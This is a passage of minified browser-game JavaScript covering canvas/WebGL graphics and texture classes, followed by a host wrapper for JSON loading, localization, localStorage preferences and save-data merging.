        this.currentPath ? 0 === this.currentPath.shape.points.length && (this.currentPath.shape.points = [0, 0]) : this.moveTo(0, 0);
        for (var a, s, l, h, d, c = this.currentPath.shape.points, u = c[c.length - 2], f = c[c.length - 1], p = 0, g = 1; g <= 20; g++) l = (s = (a = 1 - (p = g / 20)) * a) * a, d = (h = p * p) * p, c.push(l * u + 3 * s * p * e + 3 * a * h * i + d * r, l * f + 3 * s * p * t + 3 * a * h * n + d * o);
        return this.dirty = !0, this
    }, e.Graphics.prototype.arcTo = function(e, t, i, n, r) {
        this.currentPath ? 0 === this.currentPath.shape.points.length && this.currentPath.shape.points.push(e, t) : this.moveTo(e, t);
        var o = this.currentPath.shape.points,
            a = o[o.length - 2],
            s = o[o.length - 1] - t,
            l = a - e,
            h = n - t,
            d = i - e,
            c = Math.abs(s * d - l * h);
        if (c < 1e-8 || 0 === r) o[o.length - 2] === e && o[o.length - 1] === t || o.push(e, t);
        else {
            var u = s * s + l * l,
                f = h * h + d * d,
                p = s * h + l * d,
                g = r * Math.sqrt(u) / c,
                v = r * Math.sqrt(f) / c,
                m = g * p / u,
                y = v * p / f,
                w = g * d + v * l,
                S = g * h + v * s,
                x = l * (v + m),
                b = s * (v + m),
                _ = d * (g + y),
                T = h * (g + y),
                C = Math.atan2(b - S, x - w),
                R = Math.atan2(T - S, _ - w);
            this.arc(w + e, S + t, r, C, R, l * h > d * s)
        }
        return this.dirty = !0, this
    }, e.Graphics.prototype.arc = function(e, t, i, n, r, o) {
        var a, s = e + Math.cos(n) * i,
            l = t + Math.sin(n) * i;
        if (this.currentPath ? 0 === (a = this.currentPath.shape.points).length ? a.push(s, l) : a[a.length - 2] === s && a[a.length - 1] === l || a.push(s, l) : (this.moveTo(s, l), a = this.currentPath.shape.points), n === r) return this;
        !o && r <= n ? r += 2 * Math.PI : o && n <= r && (n += 2 * Math.PI);
        var h = o ? -1 * (n - r) : r - n,
            d = Math.abs(h) / (2 * Math.PI) * 40;
        if (0 === h) return this;
        for (var c = h / (2 * d), u = 2 * c, f = Math.cos(c), p = Math.sin(c), g = d - 1, v = g % 1 / g, m = 0; m <= g; m++) {
            var y = c + n + u * (m + v * m),
                w = Math.cos(y),
                S = -Math.sin(y);
            a.push((f * w + p * S) * i + e, (f * -S + p * w) * i + t)
        }
        return this.dirty = !0, this
    }, e.Graphics.prototype.beginFill = function(e, t) {
        return this.filling = !0, this.fillColor = e || 0, this.fillAlpha = void 0 === t ? 1 : t, this.currentPath && this.currentPath.shape.points.length <= 2 && (this.currentPath.fill = this.filling, this.currentPath.fillColor = this.fillColor, this.currentPath.fillAlpha = this.fillAlpha), this
    }, e.Graphics.prototype.endFill = function() {
        return this.filling = !1, this.fillColor = null, this.fillAlpha = 1, this
    }, e.Graphics.prototype.drawRect = function(t, i, n, r) {
        return this.drawShape(new e.Rectangle(t, i, n, r)), this
    }, e.Graphics.prototype.drawRoundedRect = function(t, i, n, r, o) {
        return this.drawShape(new e.RoundedRectangle(t, i, n, r, o)), this
    }, e.Graphics.prototype.drawCircle = function(t, i, n) {
        return this.drawShape(new e.Circle(t, i, n)), this
    }, e.Graphics.prototype.drawEllipse = function(t, i, n, r) {
        return this.drawShape(new e.Ellipse(t, i, n, r)), this
    }, e.Graphics.prototype.drawPolygon = function(t) {
        return t instanceof Array || (t = Array.prototype.slice.call(arguments)), this.drawShape(new e.Polygon(t)), this
    }, e.Graphics.prototype.clear = function() {
        return this.lineWidth = 0, this.filling = !1, this.dirty = !0, this.clearDirty = !0, this.graphicsData = [], this
    }, e.Graphics.prototype._renderWebGL = function(t) {
        if (!1 !== this.visible && 0 !== this.alpha && !0 !== this.isMask) {
            if (t.spriteBatch.stop(), t.blendModeManager.setBlendMode(this.blendMode), this._mask && t.maskManager.pushMask(this._mask, t), this._filters && t.filterManager.pushFilter(this._filterBlock), this.blendMode !== t.spriteBatch.currentBlendMode) {
                t.spriteBatch.currentBlendMode = this.blendMode;
                var i = e.blendModesWebGL[t.spriteBatch.currentBlendMode];
                t.spriteBatch.gl.blendFunc(i[0], i[1])
            }
            if (this.webGLDirty && (this.dirty = !0, this.webGLDirty = !1), e.WebGLGraphics.renderGraphics(this, t), this.children.length) {
                t.spriteBatch.start();
                for (var n = 0, r = this.children.length; n < r; n++) this.children[n]._renderWebGL(t);
                t.spriteBatch.stop()
            }
            this._filters && t.filterManager.popFilter(), this._mask && t.maskManager.popMask(this.mask, t), t.drawCount++, t.spriteBatch.start()
        }
    }, e.Graphics.prototype._renderCanvas = function(t) {
        if (!1 !== this.visible && 0 !== this.alpha && !0 !== this.isMask) {
            var i = t.context,
                n = this.worldTransform;
            this.blendMode !== t.currentBlendMode && (t.currentBlendMode = this.blendMode, i.globalCompositeOperation = e.blendModesCanvas[t.currentBlendMode]), this._mask && t.maskManager.pushMask(this._mask, t), i.setTransform(n.a, n.b, n.c, n.d, n.tx, n.ty), this.tint != this.oldTint && (this.dirty = !0, this.oldTint = this.tint), e.CanvasGraphics.renderGraphics(this, i);
            for (var r = 0, o = this.children.length; r < o; r++) this.children[r]._renderCanvas(t);
            this._mask && t.maskManager.popMask(t)
        }
    }, e.Graphics.prototype.getBounds = function(t) {
        if (this.isMask) return e.EmptyRectangle;
        this.dirty && (this.updateLocalBounds(), this.webGLDirty = !0, this.cachedSpriteDirty = !0, this.dirty = !1);
        var i = this._localBounds,
            n = i.x,
            r = i.width + i.x,
            o = i.y,
            a = i.height + i.y,
            s = t || this.worldTransform,
            l = s.a,
            h = s.b,
            d = s.c,
            c = s.d,
            u = s.tx,
            f = s.ty,
            p = l * r + d * a + u,
            g = c * a + h * r + f,
            v = l * n + d * a + u,
            m = c * a + h * n + f,
            y = l * n + d * o + u,
            w = c * o + h * n + f,
            S = l * r + d * o + u,
            x = c * o + h * r + f,
            b = p,
            _ = g,
            T = p,
            C = g;
        return T = S < (T = y < (T = v < T ? v : T) ? y : T) ? S : T, C = x < (C = w < (C = m < C ? m : C) ? w : C) ? x : C, b = S > (b = y > (b = v > b ? v : b) ? y : b) ? S : b, _ = x > (_ = w > (_ = m > _ ? m : _) ? w : _) ? x : _, this._bounds.x = T, this._bounds.width = b - T, this._bounds.y = C, this._bounds.height = _ - C, this._bounds
    }, e.Graphics.prototype.updateLocalBounds = function() {
        var t = 1 / 0,
            i = -1 / 0,
            n = 1 / 0,
            r = -1 / 0;
        if (this.graphicsData.length)
            for (var o, a, s, l, h, d, c = 0; c < this.graphicsData.length; c++) {
                var u = this.graphicsData[c],
                    f = u.type,
                    p = u.lineWidth;
                if (o = u.shape, f === e.Graphics.RECT || f === e.Graphics.RREC) s = o.x - p / 2, l = o.y - p / 2, t = s < t ? s : t, i = s + (h = o.width + p) > i ? s + h : i, n = l < n ? l : n, r = l + (d = o.height + p) > r ? l + d : r;
                else if (f === e.Graphics.CIRC) s = o.x, l = o.y, t = s - (h = o.radius + p / 2) < t ? s - h : t, i = s + h > i ? s + h : i, n = l - (d = o.radius + p / 2) < n ? l - d : n, r = l + d > r ? l + d : r;
                else if (f === e.Graphics.ELIP) s = o.x, l = o.y, t = s - (h = o.width + p / 2) < t ? s - h : t, i = s + h > i ? s + h : i, n = l - (d = o.height + p / 2) < n ? l - d : n, r = l + d > r ? l + d : r;
                else {
                    a = o.points;
                    for (var g = 0; g < a.length; g += 2) t = (s = a[g]) - p < t ? s - p : t, i = s + p > i ? s + p : i, n = (l = a[g + 1]) - p < n ? l - p : n, r = l + p > r ? l + p : r
                }
            } else t = 0, i = 0, n = 0, r = 0;
        var v = this.boundsPadding;
        this._localBounds.x = t - v, this._localBounds.width = i - t + 2 * v, this._localBounds.y = n - v, this._localBounds.height = r - n + 2 * v
    }, e.Graphics.prototype.drawShape = function(t) {
        this.currentPath && this.currentPath.shape.points.length <= 2 && this.graphicsData.pop(), this.currentPath = null;
        var i = new e.GraphicsData(this.lineWidth, this.lineColor, this.lineAlpha, this.fillColor, this.fillAlpha, this.filling, t);
        return this.graphicsData.push(i), i.type === e.Graphics.POLY && (i.shape.closed = this.filling, this.currentPath = i), this.dirty = !0, i
    }, e.GraphicsData = function(e, t, i, n, r, o, a) {
        this.lineWidth = e, this.lineColor = t, this.lineAlpha = i, this._lineTint = t, this.fillColor = n, this.fillAlpha = r, this._fillTint = n, this.fill = o, this.shape = a, this.type = a.type
    }, e.Graphics.POLY = 0, e.Graphics.RECT = 1, e.Graphics.CIRC = 2, e.Graphics.ELIP = 3, e.Graphics.RREC = 4, e.Polygon.prototype.type = e.Graphics.POLY, e.Rectangle.prototype.type = e.Graphics.RECT, e.Circle.prototype.type = e.Graphics.CIRC, e.Ellipse.prototype.type = e.Graphics.ELIP, e.RoundedRectangle.prototype.type = e.Graphics.RREC, e.BaseTextureCache = {}, e.BaseTextureCacheIdGenerator = 0, e.BaseTexture = function(t, i) {
        if (this.width = 100, this.height = 100, this.scaleMode = i || e.scaleModes.DEFAULT, this.hasLoaded = !1, this.source = t, this._UID = e._UID++, this.premultipliedAlpha = !0, this._glTextures = [], this._dirty = [!0, !0, !0, !0], t) {
            if ((this.source.complete || this.source.getContext) && this.source.width && this.source.height) this.hasLoaded = !0, this.width = this.source.naturalWidth || this.source.width, this.height = this.source.naturalHeight || this.source.height, this.dirty();
            else {
                var n = this;
                this.source.onload = function() {
                    n.source && (n.hasLoaded = !0, n.width = n.source.naturalWidth || n.source.width, n.height = n.source.naturalHeight || n.source.height, n.dirty(), window.dirtyOnce = !0, n.dispatchEvent({
                        type: "loaded",
                        content: n
                    }))
                }, this.source.onerror = function() {
                    n.dispatchEvent({
                        type: "error",
                        content: n
                    })
                }
            }
            this.imageUrl = null
        }
    }, e.BaseTexture.prototype.constructor = e.BaseTexture, e.EventTarget.mixin(e.BaseTexture.prototype), e.BaseTexture.prototype.destroy = function() {
        this.imageUrl && (delete e.BaseTextureCache[this.imageUrl], delete e.TextureCache[this.imageUrl], this.imageUrl = null, this.source.src = ""), this.source = null, this.unloadFromGPU()
    }, e.BaseTexture.prototype.dirty = function() {
        for (var e = 0; e < this._glTextures.length; e++) this._dirty[e] = !0
    }, e.BaseTexture.prototype.unloadFromGPU = function() {
        this.dirty();
        for (var t = this._glTextures.length - 1; t >= 0; t--) {
            var i = this._glTextures[t],
                n = e.glContexts[t];
            n && i && n.deleteTexture(i)
        }
        this._glTextures.length = 0, this.dirty()
    }, e.BaseTexture.fromImage = function(t, i, n) {
        var r = e.BaseTextureCache[t];
        if (void 0 === i && -1 === t.indexOf("data:") && (i = !0), !r) {
            var o = new Image;
            i && (o.crossOrigin = ""), o.src = t, (r = new e.BaseTexture(o, n)).imageUrl = t, e.BaseTextureCache[t] = r
        }
        return r
    }, e.BaseTexture.fromCanvas = function(t, i) {
        return new e.BaseTexture(t, i)
    }, e.TextureCache = {}, e.FrameCache = {}, e.TextureCacheIdGenerator = 0, e.Texture = function(t, i, n, r, o) {
        this.noFrame = !1, this.resolution = o || 1, i || (this.noFrame = !0, i = new e.Rectangle(0, 0, 1, 1)), t instanceof e.Texture && (t = t.baseTexture), this.baseTexture = t, this.floorCoordinates = !0, this.frame = i, this.trim = r, this.valid = !1, this.requiresUpdate = !1, this._uvs = null, this.width = 0, this.height = 0, this.crop = n || new e.Rectangle(0, 0, 1, 1), t.hasLoaded ? (this.noFrame && (i = new e.Rectangle(0, 0, t.width / this.resolution, t.height / this.resolution)), this.setFrame(i)) : t.addEventListener("loaded", this.onBaseTextureLoaded.bind(this))
    }, e.Texture.prototype.constructor = e.Texture, e.EventTarget.mixin(e.Texture.prototype), e.Texture.prototype.onBaseTextureLoaded = function() {
        var t = this.baseTexture;
        t.removeEventListener("loaded", this.onLoaded), this.noFrame && (this.frame = new e.Rectangle(0, 0, t.width / this.resolution, t.height / this.resolution)), this.setFrame(this.frame), this.dispatchEvent({
            type: "update",
            content: this
        })
    }, e.Texture.prototype.destroy = function(e) {
        e && this.baseTexture.destroy(), this.valid = !1
    }, e.Texture.prototype.setFrame = function(e) {
        if (this.noFrame = !1, this.frame = e, this.width = e.width, this.height = e.height, this.crop.x = e.x, this.crop.y = e.y, this.crop.width = e.width, this.crop.height = e.height, !this.trim && (e.x + e.width > this.baseTexture.width / this.resolution || e.y + e.height > this.baseTexture.height / this.resolution)) throw new Error("Texture Error: frame does not fit inside the base Texture dimensions " + this);
        this.valid = e && e.width && e.height && this.baseTexture.source && this.baseTexture.hasLoaded, this.trim && (this.width = this.trim.width, this.height = this.trim.height, this.frame.width = this.trim.width, this.frame.height = this.trim.height), this.valid && this._updateUvs()
    }, e.Texture.prototype._updateUvs = function() {
        this._uvs || (this._uvs = new e.TextureUvs);
        var t = this.crop,
            i = this.resolution,
            n = this.baseTexture.width / i,
            r = this.baseTexture.height / i;
        this._uvs.x0 = t.x / n, this._uvs.y0 = t.y / r, this._uvs.x1 = (t.x + t.width) / n, this._uvs.y1 = t.y / r, this._uvs.x2 = (t.x + t.width) / n, this._uvs.y2 = (t.y + t.height) / r, this._uvs.x3 = t.x / n, this._uvs.y3 = (t.y + t.height) / r
    }, e.Texture.fromImage = function(t, i, n, r) {
        var o = t;
        1 != (r = r || 1) && (o += ":" + r);
        var a = e.TextureCache[o];
        return a || (a = new e.Texture(e.BaseTexture.fromImage(t, i, n), r), e.TextureCache[o] = a), a
    }, e.Texture.fromFrame = function(t) {
        var i = e.TextureCache[t];
        if (!i) throw new Error('The frameId "' + t + '" does not exist in the texture cache ');
        return i
    }, e.Texture.fromCanvas = function(t, i, n) {
        var r = e.BaseTexture.fromCanvas(t, i);
        return new e.Texture(r, void 0, void 0, void 0, n)
    }, e.Texture.addTextureToCache = function(t, i) {
        e.TextureCache[i] = t
    }, e.Texture.removeTextureFromCache = function(t) {
        var i = e.TextureCache[t];
        return delete e.TextureCache[t], delete e.BaseTextureCache[t], i
    }, e.TextureUvs = function() {
        this.x0 = 0, this.y0 = 0, this.x1 = 0, this.y1 = 0, this.x2 = 0, this.y2 = 0, this.x3 = 0, this.y3 = 0
    }, e.Texture.emptyTexture = new e.Texture(new e.BaseTexture), e.RenderTexture = function(t, i, n, r) {
        if (this.width = t || 100, this.height = i || 100, this.frame = new e.Rectangle(0, 0, this.width, this.height), this.crop = new e.Rectangle(0, 0, this.width, this.height), this.baseTexture = new e.BaseTexture, this.baseTexture.width = this.width, this.baseTexture.height = this.height, this.baseTexture._glTextures = [], this.baseTexture.scaleMode = r || e.scaleModes.DEFAULT, this.baseTexture.hasLoaded = !0, e.Texture.call(this, this.baseTexture, new e.Rectangle(0, 0, this.width, this.height)), this.renderer = n || e.defaultRenderer, this.renderer.type === e.WEBGL_RENDERER) {
            var o = this.renderer.gl;
            this.baseTexture._dirty[o.id] = !1, this.textureBuffer = new e.FilterTexture(o, this.width, this.height, this.baseTexture.scaleMode), this.baseTexture._glTextures[o.id] = this.textureBuffer.texture, this.render = this.renderWebGL, this.projection = new e.Point(.5 * this.width, .5 * -this.height)
        } else this.render = this.renderCanvas, this.textureBuffer = new e.CanvasBuffer(this.width, this.height), this.baseTexture.source = this.textureBuffer.canvas;
        this.valid = !0, this._updateUvs()
    }, e.RenderTexture.prototype = Object.create(e.Texture.prototype), e.RenderTexture.prototype.constructor = e.RenderTexture, e.RenderTexture.prototype.resize = function(t, i, n) {
        t === this.width && i === this.height || (this.valid = t > 0 && i > 0, this.width = this.frame.width = this.crop.width = t, this.height = this.frame.height = this.crop.height = i, n && (this.baseTexture.width = this.width, this.baseTexture.height = this.height), this.renderer.type === e.WEBGL_RENDERER && (this.projection.x = this.width / 2, this.projection.y = -this.height / 2), this.valid && this.textureBuffer.resize(this.width, this.height))
    }, e.RenderTexture.prototype.clear = function() {
        this.valid && (this.renderer.type === e.WEBGL_RENDERER && this.renderer.gl.bindFramebuffer(this.renderer.gl.FRAMEBUFFER, this.textureBuffer.frameBuffer), this.textureBuffer.clear())
    }, e.RenderTexture.prototype.renderWebGL = function(e, t, i) {
        if (this.valid) {
            var n = e.worldTransform;
            n.identity(), n.translate(0, 2 * this.projection.y), t && n.append(t), n.scale(1, -1), e.worldAlpha = 1;
            for (var r = e.children, o = 0, a = r.length; o < a; o++) r[o].updateTransform();
            var s = this.renderer.gl;
            s.viewport(0, 0, this.width, this.height), s.bindFramebuffer(s.FRAMEBUFFER, this.textureBuffer.frameBuffer), i && this.textureBuffer.clear(), this.renderer.spriteBatch.dirty = !0, this.renderer.renderDisplayObject(e, this.projection, this.textureBuffer.frameBuffer), this.renderer.spriteBatch.dirty = !0
        }
    }, e.RenderTexture.prototype.renderCanvas = function(e, t, i) {
        if (this.valid) {
            var n = e.worldTransform;
            n.identity(), t && n.append(t), e.worldAlpha = 1;
            for (var r = e.children, o = 0, a = r.length; o < a; o++) r[o].updateTransform();
            i && this.textureBuffer.clear();
            var s = this.textureBuffer.context;
            this.renderer.renderDisplayObject(e, s)
        }
    }, e.AbstractFilter = function(e, t) {
        this.passes = [this], this.shaders = [], this.dirty = !0, this.padding = 0, this.uniforms = t || {}, this.fragmentSrc = e || []
    }, e.AbstractFilter.prototype.constructor = e.AbstractFilter, e.AbstractFilter.prototype.syncUniforms = function() {
        for (var e = 0, t = this.shaders.length; e < t; e++) this.shaders[e].dirty = !0
    }, e
}
Host = function() {
        var e = {},
            t = window.Host || {};

        function n(e, t, i, n, r) {
            var o = new XMLHttpRequest;
            o.crossOrigin = "anonymous", o.overrideMimeType && o.overrideMimeType("application/json");
            try {
                o.open(e, t, !0), "POST" == e && o.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), o.onreadystatechange = function() {
                    if (4 == o.readyState)
                        if ("200" == o.status) {
                            var e = {};
                            try {
                                e = JSON.parse(o.responseText)
                            } catch (e) {
                                return window.onerror && window.onerror("Failed to parse JSON return data " + t + "> " + e.message, e.sourceURL, e.line), void r()
                            }
                            n(e)
                        } else o = o.onreadystatechange = null, r && r()
                }, o.send(i)
            } catch (e) {
                window.onerror && window.onerror("Failed to execute JSON load code " + t + "> " + e.message, e.sourceURL, e.line), r()
            }
        }

        function r(e, t, i) {
            var n = this;
            null == t && (t = ""), n.translated = t.toString(), n.replacements = i, n.original = e, n.toString = function() {
                return n.translated
            }
        }
        t.call = function(i, n, r) {
            null != r && (callbackId = "cb" + Math.round(99999 * Math.random()) + (new Date).getTime(), e[callbackId] = r, n._callback = callbackId), n._method = i, t.sendToHost("json1:" + JSON.stringify(n))
        }, t.callResult = function(t) {
            var i = t.indexOf(":");
            if (i > 0) {
                var n = t.substring(0, i),
                    r = t.substring(i + 1);
                switch (n) {
                    case "json1":
                        var o = JSON.parse(r),
                            a = e[o._callback];
                        a && (delete o._callback, a(o))
                }
            }
        }, t.Application = {}, t.Application.SetStatusbarColor = function(e) {}, t.onPauseEvent = function() {}, t.onResumeEvent = function() {}, t.onMarginsChanged = function(e) {
            t.Log("Margins changed! [t:" + e.top + ", b:" + e.bottom + ", l:" + e.left + ", r:" + e.right + "]"), XS.styles.margins.top = e.top, XS.styles.margins.bottom = e.bottom, XS.styles.margins.left = e.left, XS.styles.margins.right = e.right
        }, t.pauseResizing = function() {
            XS.skipResizing = !0
        }, t.resumeResizing = function() {
            XS.skipResizing = !1, window.dispatchEvent(new Event("resize"))
        }, t.onSafeToExitEvent = function() {
            var e = {
                type: "ShowModal"
            };
            return e.titleTxt = t.Localize.Translate("Progress might be lost if you exit {game_name} now!", {
                game_name: Config.shortTitle
            }).toString(), e.msgTxt = t.Localize.Translate("Are you sure you want to close the app?").toString(), e.confirmTxt = t.Localize.Translate("Confirm").toString(), e.confirmCb = function() {}, e.cancelTxt = t.Localize.Translate("Cancel").toString(), e.cancelCb = function() {
                XS.unfreeze()
            }, XS.freeze(), e
        }, t.makeGameShareURL = function() {
            return encodeURI("https://" + Config.domain + "/alc/")
        }, t.Preferences = {}, t.Preferences.cache = {}, t.Preferences.QuickBool = function(e) {
            return {
                get: function() {
                    return t.Preferences.cache[e] || !1
                },
                set: function(i) {
                    t.Preferences.SetBool(e, i)
                },
                remove: function() {
                    t.Preferences.Remove(e)
                }
            }
        }, t.Preferences.QuickInt = function(e) {
            return {
                get: function() {
                    return parseInt(t.Preferences.cache[e]) || 0
                },
                set: function(i) {
                    t.Preferences.SetInt(e, i)
                },
                remove: function() {
                    t.Preferences.Remove(e)
                }
            }
        }, t.Preferences.QuickFloat = function(e) {
            return {
                get: function() {
                    return parseFloat(t.Preferences.cache[e]) || 0
                },
                set: function(i) {
                    t.Preferences.SetFloat(e, i)
                },
                remove: function() {
                    t.Preferences.Remove(e)
                }
            }
        }, t.Preferences.QuickString = function(e) {
            return {
                get: function() {
                    return t.Preferences.cache[e] || ""
                },
                set: function(i) {
                    t.Preferences.SetString(e, i)
                },
                remove: function() {
                    t.Preferences.Remove(e)
                }
            }
        }, t.Tools = {}, t.Tools.LoadJSON = function(e, t, i) {
            n("GET", e, null, t, i)
        }, t.Tools.SendJSON = function(e, t, i, r) {
            n("POST", e, t, i, r)
        }, t.Web = {}, t.Web.GetQueryString = function(e) {
            var t = window.location.href;
            e = e.replace(/[\[\]]/g, "\\$&");
            var i = new RegExp("[?&]" + e + "(=([^&#]*)|&|#|$)", "i").exec(t);
            return i ? i[2] ? decodeURIComponent(i[2].replace(/\+/g, " ")) : "" : null
        }, t.Localize = t.Localize || {}, t.Localize.Translations = {
            en: {}
        }, t.Localize.LocalizedString = r, t.Localize._currentLanguage = "en-US", t.Localize.TranslationsCache && (! function(e, t) {
            for (var i in e)
                if (e.hasOwnProperty(i)) {
                    var n = e[i];
                    for (var r in n) t[r] = t[r] || {}, t[r][i] = {
                        translation: n[r]
                    }
                }
        }(t.Localize.TranslationsCache, t.Localize.Translations), delete t.Localize.TranslationsCache);
        var o = {},
            a = !1;
        return t.Localize.UpdateChildren = function(e) {
            if (a)
                for (var i in e.children) {
                    var n = e.children[i];
                    n instanceof Text2 ? n.onLanguageChange() : n instanceof Container && t.Localize.UpdateChildren(n)
                }
        }, t.Localize.Load = function(e, i) {
            return a = !0, t.Localize.Translations[e] ? (o = t.Localize.Translations[e], t.Localize._currentLanguage = e, Text2.onLanguageChange(), XS.emit("language-changed", {
                language: e
            }), i && i(e, !0), !0) : (t.Tools.LoadJSON("./languages/" + e + ".json", function(n) {
                for (key in t.Localize._currentLanguage = e, o = t.Localize.Translations[e] = n, console.log("Loaded language json for: " + e, o), n) {
                    var r = n[key],
                        a = key.replace(/\\n/g, "\n");
                    a != key && (delete n[key], r.translation ? (r.translation = r.translation.replace("\\n", "\n"), n[a] = r) : (console.warn('Missing translation: "' + key + '"'), n[a] = key))
                }
                Text2.onLanguageChange(), XS.emit("language-changed", {
                    language: e
                }), i && i(e, !0)
            }, function() {
                console.warn("failed to load language"), i && i(e, !1)
            }), !1)
        }, t.Localize.CurrentLanguage = function() {
            return t.Localize._currentLanguage
        }, t.Localize.languages = t.Localize.languages || [], t.Localize.Test = function() {
            var e = 0,
                i = window.onkeydown;
            window.onkeydown = function(n) {
                var r = n.keyCode;
                37 == r && (e -= 1), 39 == r && (e += 1), e += t.Localize.languages.length, e %= t.Localize.languages.length, t.Localize.Load(t.Localize.languages[e]), i && i(n)
            }
        }, t.Localize.Translate = function(e, t) {
            var i = e;
            if (e instanceof r) {
                i = e.original;
                var n = {};
                for (var a in e.replacements) n[a] = e.replacements[a];
                for (var a in t) n[a] = t[a];
                t = n
            }
            for (var a in e = o[i] && null !== o[i].translation ? o[i].translation : i, t) e = e.split("{" + a + "}").join(t[a]);
            return new r(i, e, t)
        }, t.Localize.GetLanguage = function() {
            var e = window.navigator;
            if (Array.isArray(e.languages))
                for (i = 0; i < e.languages.length; i++)
                    if (language = e.languages[i], language && language.length) return language;
            var t = ["language", "browserLanguage", "systemLanguage", "userLanguage"];
            for (i = 0; i < t.length; i++)
                if (language = e[t[i]], language && language.length) return language;
            return "en"
        }, t.Type = "undefined", t
    }(),
    function(e) {
        e.Host = e.Host || {}, Host.Type = "web", Host.Log = function(e) {
            console.log(e)
        }, Host.WrapperLog = function(e) {}, Host.sendToHost = function() {};
        var t, i = (t = {}, function() {
            try {
                return "localStorage" in window && null !== window.localStorage
            } catch (e) {
                return !1
            }
        }() ? {
            set: function(e, i) {
                t[e] = i;
                try {
                    localStorage.setItem(Config.id + e, i)
                } catch (e) {}
            },
            get: function(e) {
                return t[e] || localStorage.getItem(Config.id + e)
            },
            remove: function(e) {
                delete t[e], localStorage.removeItem(Config.id + e)
            }
        } : {
            set: function(e, i) {
                t[e] = i
            },
            get: function(e) {
                return t[e]
            },
            remove: function(e) {
                delete t[e]
            }
        });
        Host.Preferences = Host.Preferences || {}, Host.Preferences.SetBool = function(e, t) {
            Host.Preferences.cache[e] = t, i.set(e, t ? "true" : "false")
        }, Host.Preferences.SetInt = function(e, t) {
            Host.Preferences.cache[e] = t, i.set(e, t)
        }, Host.Preferences.SetFloat = function(e, t) {
            Host.Preferences.cache[e] = t, i.set(e, t)
        }, Host.Preferences.SetString = function(e, t) {
            Host.Preferences.cache[e] = t, i.set(e, t)
        }, Host.Preferences.Remove = function(e) {
            delete Host.Preferences.cache[e], i.remove(e)
        }, Host.Preferences.GetBool = function(e, t) {
            var n = null !== i.get(e) || Host.Preferences.cache.hasOwnProperty(e),
                r = "true" == i.get(e);
            Host.Preferences.cache[e] = r, t && t(r, n)
        }, Host.Preferences.GetInt = function(e, t) {
            var n = null !== i.get(e) || Host.Preferences.cache.hasOwnProperty(e),
                r = parseInt(i.get(e));
            Host.Preferences.cache[e] = r, t && t(r, n)
        }, Host.Preferences.GetFloat = function(e, t) {
            var n = null !== i.get(e) || Host.Preferences.cache.hasOwnProperty(e),
                r = parseFloat(i.get(e));
            Host.Preferences.cache[e] = r, t && t(r, n)
        }, Host.Preferences.GetString = function(e, t) {
            var n = null !== i.get(e) || Host.Preferences.cache.hasOwnProperty(e),
                r = i.get(e);
            Host.Preferences.cache[e] = r, t && t(r, n)
        }, Host.Localize.Translate = Host.Localize.Translate || {}, Host.Localize.Translate.GetString = function(e) {
            return Lang[e] || "!!No translation found!!"
        }
    }(this),
    function(e) {
        var t = {};
        t.higherIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : Math.max(e || 0, t || 0)
        }, t.lowerIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : Math.min(e || 0, t || 0)
        }, t.longerIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : (e || "").length >= (t || "").length ? e : t
        }, t.shorterIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : (e || "").length <= (t || "").length ? e : t
        }, t.trueIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : e || t || !1
        }, t.falseIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : e && t || !1
        }, t.firstIsBetter = function(e, t) {
            return void 0 === e ? t : e
        }, t.secondIsBetter = function(e, t) {
            return void 0 === e ? t : void 0 === t ? e : t
        }, t.recursive = function(e) {
            function i(i, n, r, o) {
                for (prop in n) {
                    var a = e[typeof n[prop]];
                    if (!a) {
                        var s = "XS.data.merge.recursive: Unsupported merge type (property: " + prop + "): " + typeof n[prop] + " - defaulting to second arg";
                        console.error(s), a = e.default || t.secondIsBetter
                    }
                    i[prop] = a(r[prop], o[prop])
                }
            }
            var n = function(e, t) {
                var n = {};
                return i(n, e, e, t), i(n, t, e, t), n
            };
            return e.object = e.object || n, n
        }, t.higherAndTrueIsBetter = t.recursive({
            number: t.higherIsBetter,
            boolean: t.trueIsBetter
        });
        var i = {
            int: {
                defVal: 0,
                defMerge: t.higherIsBetter,
                localGet: Host.Preferences.GetInt,
                localSet: Host.Preferences.SetInt
            },
            float: {
                defVal: 0,
                defMerge: t.higherIsBetter,
                localGet: Host.Preferences.GetFloat,
                localSet: Host.Preferences.SetFloat
            },
            string: {
                defVal: "",
                defMerge: t.longerIsBetter,
                localGet: Host.Preferences.GetString,
                localSet: Host.Preferences.SetString
            },
            bool: {
                defVal: !1,
                defMerge: t.trueIsBetter,
                localGet: Host.Preferences.GetBool,
                localSet: Host.Preferences.SetBool
            },
            object: {
                defVal: {},
                defMerge: t.firstIsBetter,
                localGet: function(e, t) {
                    Host.Preferences.GetString(e, function(e, i) {
                        var n = void 0;
                        try {
                            n = JSON.parse(e)
                        } catch (e) {
                            n = {}
                        }
                        t && t(n, i)
                    })
                },
                localSet: function(e, t) {
                    t = JSON.stringify(t), Host.Preferences.SetString(e, t)
                }
            }
        };

        function n() {
            this._elems = {}, this._providers = [], this._saveInterval = 5e3, this._saveIntervalId = void 0, this._boundSaveAll = this.save.bind(this, void 0)
        }
        n.prototype._typeMap = i, n.prototype._keyExists = function(e) {
            return this._elems.hasOwnProperty(e)
        }, n.prototype._getKey = function(e) {
            return this._elems[e] && this._elems[e].value
        }, n.prototype._setKey = function(e, t) {
            if (this._keyExists(e)) {
                var i = this._elems[e];
                JSON.stringify(i.value) != JSON.stringify(t) && (i.value = t, i.setLocal(t), i.dirtyRemote = !0)
            }
        }, n.prototype._remoteKeys = function() {
            var e = [],
                t = this._elems;
            for (var i in t) t[i].remote && e.push(i);
            return e
        }, n.prototype._subscribedRemote = function(e) {
            for (var t = this._providers, i = 0; i < t.length; i++)
                if (t[i].remote === e) return !0;
            return !1
        }, n.prototype._addRemote = function(e) {
            if (e && "object" == typeof e && !this._subscribedRemote(e)) {
                var t = {
                    remote: e,
                    init: !1
                };
                this._providers.push(t)
            }
        }, n.prototype._addDefaultRemotes = function() {
            var e = r.is.facebookInstant ? window.Social.Instant : XC;
            this._addRemote(e)
        }, n.prototype._initRemote = function(e) {
            var t = this._providers;
            if (e)
                for (var i = 0; i < t.length; i++)
                    if (t[i].remote === e) return t[i].init = !0
        }, n.prototype._mergeRemoteDataElements = function(e) {
